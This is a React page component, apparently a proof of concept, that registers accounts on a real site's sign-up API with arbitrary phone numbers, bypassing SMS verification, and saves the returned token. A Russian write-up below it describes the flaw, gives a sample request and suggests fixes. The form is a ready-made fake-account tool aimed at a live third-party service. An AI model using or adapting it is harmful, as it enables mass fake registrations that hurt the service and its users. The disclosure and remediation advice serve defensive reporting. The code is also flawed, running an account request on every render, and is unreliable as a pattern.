import React, { useState } from 'react';
import Cookies from 'js-cookie';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import Logo from '../pages/himarket.png';
import axios from 'axios';
import { Link, useNavigate } from 'react-router-dom';

export default function Example() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');
  const [isValidPhoneNumber, setIsValidPhoneNumber] = useState(true);
  const [data, setData] = useState(null);

  const formatPhoneNumber = (input) => {
    const cleanedInput = input.replace(/\D/g, '');

    let formattedNumber = '';
    for (let i = 0; i < cleanedInput.length; i++) {
      if (i === 2 || i === 5 || i === 7) {
        formattedNumber += '-';
      }
      formattedNumber += cleanedInput[i];
    }
    return formattedNumber;
  };

  const handlePhoneNumberChange = (event) => {
    const input = event.target.value;
    const formattedNumber = formatPhoneNumber(input);

    setPhoneNumber(formattedNumber);

    // Check if the formatted number matches the correct pattern
    setIsValidPhoneNumber(/^\d{2}-\d{3}-\d{2}-\d{2}$/.test(formattedNumber));
  };

  const navigate = useNavigate();


  try {
    const fetchData = async () => {
      const apiUrl = 'https://api.client.rizomulk.uz/api/v1/account/get';
  
      const config = {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${Cookies.get('bearer-token')}`,
        },
      };
  
      const response = await axios.get(apiUrl, config);
  
      // Assuming setData is a state setter for handling the response data
      setData(response.data);
  
      toast.success(response.data.data.accountPhoneNumber);
    };
  
    fetchData();
  } catch (error) {
    toast.error('Ошибка при отправке запроса!');
  }
  


  const handleSubmit = async (e) => {
    e.preventDefault();

    const user = {
      accountFirstName: name,
      accountLastName: 'Kamolov',
      accountPhoneNumber: '+998' + phoneNumber.replace(/-/g, ''),
      accountPassword: password,
    };

    try {
      const apiUrl = 'https://api.client.rizomulk.uz/api/v1/account/sign-up';

      const config = {
        headers: {
          'Content-Type': 'application/json',
        },
      };

      const response = await axios.post(apiUrl, user, config);

      // Assuming setData is a state setter for handling the response data
      setData(response.data);

      toast.success('Вы успешно зарегистрировались');
      Cookies.set('bearer-token', response.data.data, { expires: 100 });
    } catch (error) {
      toast.error('Ошибка при отправке запроса!');
    }



    
  };

  const inputBorderColor = isValidPhoneNumber ? 'border-gray-300' : 'border-red-500';

  return (
    <>
      {/* <ToastContainer autoClose={3000} /> */}
      <div className="flex min-h-full flex-1 flex-col justify-center py-12 sm:px-6 lg:px-8">
        <Link to={'/'} className="sm:mx-auto sm:w-full sm:max-w-md">
          <img className="mx-auto h-10 w-auto" src={Logo} alt="Your Company" />
          <p className="mt-6 text-center text-2xl font-bold leading-9 tracking-tight text-gray-500">
            <a className="text-gray-900">Регистрация фальшивых номеров</a>
          </p>
        </Link>

        <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
          <div className="bg-white px-6 py-12 sm:shadow shadow-none sm:rounded-lg sm:px-12">
            <form className="space-y-6" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="name" className="block text-sm font-medium leading-6 text-gray-900">
                  Name
                </label>
                <div className="mt-2">
                  <input
                    id="name"
                    name="name"
                    type="text"
                    autoComplete="current-password"
                    required
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6"
                  />
                </div>
              </div>

              <div>
                <label htmlFor="text" className="block text-sm font-medium leading-6 text-gray-900">
                  Phone number
                </label>
                <div className={`relative mt-2 rounded-md shadow-sm ${inputBorderColor}`}>
                  <div className="absolute inset-y-0 left-0 flex items-center">
                    <label htmlFor="country" className="sr-only">
                      Country
                    </label>
                    <select
                      id="country"
                      name="country"
                      autoComplete="country"
                      className="h-full rounded-md border-0 bg-transparent py-0 pl-3 pr-1 text-gray-500 focus:outline-none sm:text-sm"
                    >
                      <option>+998</option>
                    </select>
                  </div>
                  <input
                    id="text"
                    name="text"
                    type="text"
                    autoComplete="text"
                    required
                    value={phoneNumber}
                    onChange={handlePhoneNumberChange}
                    className={`focus:outline-none focus:ring block w-full rounded-md border-0
                                    py-1.5 pl-20 text-gray-900 ring-1 ring-inset ring-gray-300
                                    placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600
                                    sm:text-sm sm:leading-6 ${isValidPhoneNumber
                      ? 'focus:ring-gray-500 ring-gray-500'
                      : 'focus:ring-red-500 ring-red-500'
                    }
                                    placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600
                                    sm:text-sm sm:leading-6`}
                  />
                  {!isValidPhoneNumber && (
                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                      <svg className="h-6 w-6 text-red-500" fill="currentColor" viewBox="0 0 30 20">
                        <g>
                          <path fill="none" d="M0 0h24v24H0z" />
                          <path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-7v2h2v-2h-2zm0-8v6h2V7h-2z" />
                        </g>
                      </svg>
                    </div>
                  )}
                </div>
              </div>

              <div>
                <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">
                  Password
                </label>
                <div className="mt-2">
                  <input
                    id="password"
                    name="password"
                    type="password"
                    autoComplete="current-password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6"
                  />
                </div>
              </div>
              <div className="flex items-center justify-between">
                <div className="text-sm">
                  <Link to={'/forgot-password'} className="font-medium text-indigo-600 hover:text-indigo-500">
                    Forgot your password?
                  </Link>
                </div>
              </div>

              <div>
                <button
                  type="submit"
                  className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                >
                  Sign in
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto p-8 my-8">
      <h2 className="text-2xl font-bold mb-4">Уязвимость регистрации без подтверждения по SMS</h2>
      
      <p className="mb-4">
        На сайте rizomulk.uz существует серьезная уязвимость, позволяющая зарегистрировать аккаунт без подтверждения по SMS,
        даже на несуществующий номер телефона. Уязвимость проявляется при использовании следующего запроса:
      </p>

      <code className="bg-gray-100 p-2 rounded-md mb-2 inline-block">
        POST https://api.client.rizomulk.uz/api/v1/account/sign-up
        <br />
        data:{"{"}
          "accountFirstName": "Muxammad",
          "accountLastName": "Kamolov",
          "accountPassword": "muxa1575",
          "accountPhoneNumber": "+998000000000"
        {"}"}
      </code>

      <p className="mb-4">
        Этот запрос позволяет злоумышленнику зарегистрировать аккаунт, указав произвольный номер телефона, который даже не существует,
        и при этом без получения кода подтверждения по SMS. Это создает серьезные риски безопасности для пользователей и системы в целом.
      </p>

      <h3 className="text-xl font-bold mt-6 mb-2">Потенциальные последствия уязвимости</h3>
      <ul className="list-disc pl-8 mb-4">
        <li>Легкость создания фальшивых учетных записей без реального подтверждения.</li>
        <li>Возможность злоумышленникам использовать вымышленные учетные записи для злонамеренных действий.</li>
        <li>Угроза безопасности для реальных пользователей и их данных.</li>
      </ul>

      <h3 className="text-xl font-bold mt-6 mb-2">Как исправить уязвимость</h3>
      <p className="mb-4">
        Для устранения уязвимости необходимо обязательное подтверждение номера телефона посредством SMS перед завершением процесса регистрации.
        Это можно осуществить с использованием технологии SMS-аутентификации, где пользователю будет отправлен уникальный код для подтверждения.
      </p>

      <p className="mb-4">
        Также следует внедрить механизм ограничения числа попыток регистрации с одного IP-адреса или номера телефона,
        чтобы предотвратить автоматизированные атаки на регистрацию.
      </p>

      <h3 className="text-xl font-bold mt-6 mb-2">Стили и опросы</h3>
      <ul className="list-disc pl-8">
        <li>Использовать простой и понятный язык.</li>
        <li>Иллюстрировать угрозы безопасности с помощью визуальных элементов.</li>
        <li>Освещать важность внедрения мер безопасности для защиты пользователей и системы.</li>
      </ul>
    </div>
    </>
  );
}
